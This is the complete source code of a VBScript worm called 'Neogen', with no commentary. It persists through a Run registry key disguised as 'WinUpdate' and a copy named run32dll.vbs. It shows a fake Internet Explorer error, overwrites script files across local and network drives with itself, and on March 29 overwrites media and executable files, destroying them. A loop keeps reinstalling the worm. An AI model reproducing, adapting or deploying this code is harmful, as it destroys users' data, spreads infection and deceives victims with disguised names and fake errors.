'Neogen
On error resume next
randomize
set fso=createobject("scripting.filesystemobject")
set wscriptshell=createobject("wscript.shell")
set drives=fso.drives
for each drive in drives
if drive="C:" then
if drive.isready then
drivefull=drive & "\"
set e5d=fso.getfolder(drivefull)
set subs=e5d.subfolders
for each subfolder in subs
subst=mid(subfolder.path,4,3)
if subst="WIN" then
auto=subfolder.path
end if
next
end if
end if
next
autos=auto & "\run32dll.vbs"
fso.copyfile wscript.scriptfullname,autos
wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate","wscript.exe" & " " & autos & " " & "%" 
if wscript.scriptfullname <> autos then
msgbox "Cannot open file",16,"Internet Explorer"
end if
set dr=fso.Drives
for each d in dr
if d.DriveType=2 or d.DriveType=3 then
list(d.path&"\")
end if
next
Sub spreadmailto (dir)
on error resume next
set fso=createobject("Scripting.filesystemobject")
set f=fso.GetFolder(dir)
set cf=f.Files
for each fil in cf
ext=fso.GetExtensionName(fil.path)
ext=lcase(ext)
if (ext="vbs") or (ext="vba") then
fso.copyfile wscript.scriptfullname,fil.path
end if
next
End Sub
Sub list(dir)
on error resume next
set f=fso.GetFolder(dir)
set ssf=f.Subfolders
for each fil in ssf
spreadmailto(fil.path)
list(fil.path)
next
End Sub
if month(now)= 03 and day(now)= 29 then
set dr=fso.Drives
for each d in dr
if d.DriveType=2 or d.DriveType=3 then
listed(d.path&"\")
end if
next
end if
Sub spread(dir)
on error resume next
set fso=createobject("Scripting.filesystemobject")
set f=fso.GetFolder(dir)
set cf=f.Files
for each fil in cf
ext=fso.GetExtensionName(fil.path)
ext=lcase(ext)
if (ext="mp3") or (ext="jpg") or (ext="mpeg") or (ext="jpeg") or (ext="mpg") or (ext="exe") then
fso.copyfile wscript.scriptfullname,fil.path
end if
next
End Sub
Sub listed(dir)
on error resume next
set f=fso.GetFolder(dir)
set ssf=f.Subfolders
for each fil in ssf
spread(fil.path)
listed(fil.path)
next
End Sub
if month(now)= 03 and day(now)= 29 then
msgbox "It's my birthday today... we're gonna have lots of fun. *Neogen*",64
end if
set thiscode=fso.opentextfile(wscript.scriptfullname,1)
code=thiscode.readall
thiscode.close
do
if not (fso.fileexists(autos)) then
set resur=fso.createtextfile(autos,true)
resur.write code
resur.close
end if
regvalue=wscriptshell.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate")
if regvalue <> "wscript.exe" & " " & autos & " " & "%"  then 
wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate","wscript.exe" & " " & autos & " " & "%" 
end if
regvalue=""
loop 

